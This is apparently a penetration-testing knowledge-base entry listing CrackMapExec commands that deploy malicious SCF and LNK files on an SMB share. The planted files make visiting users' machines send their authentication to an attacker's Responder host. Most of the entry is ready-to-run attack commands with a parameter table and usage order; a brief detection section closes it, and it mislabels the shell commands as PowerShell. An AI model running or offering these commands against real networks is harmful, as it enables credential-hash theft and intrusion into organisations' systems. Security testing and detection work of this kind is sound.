---
id: 80e93299-0023-4660-a0c9-319c3d3a3dfd
name: CrackMapExec-SCF-and-LNK-Attack-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:03.381652+00:00'
updated_at: '2023-04-10T20:26:21.379228+00:00'
platforms:
  - Linux
tags:
  - smb-automation
  - payload-deployment
validated: true
---

# CrackMapExec-SCF-and-LNK-Attack-Script

## Code

```powershell
crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
crackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
```

## Description

A script of CrackMapExec invocations to deploy SCF (#scf comment), LNK (#lnk), and cleanup payloads on SMB shares for SCF/URL attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.10.10.10 | Target IP | 10.10.10.10 |
| username | Valid username | domain\user |
| password | Valid password | Passw0rd! |
| NAME=WORK | Share/folder name | WORK |
| SERVER=IP_RESPONDER | Attacker IP | 192.168.1.100 |

## Usage

Run in sequence during pentest: First deploy SCF, then LNK if needed, finally cleanup. Automates file placement for remote execution triggers.

## Detection

- Sysmon logs for CME process spawning or SMB write events.
- Anomalous .scf/.lnk creation on shares.

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share]]
- [[tools/CrackMapExec]]
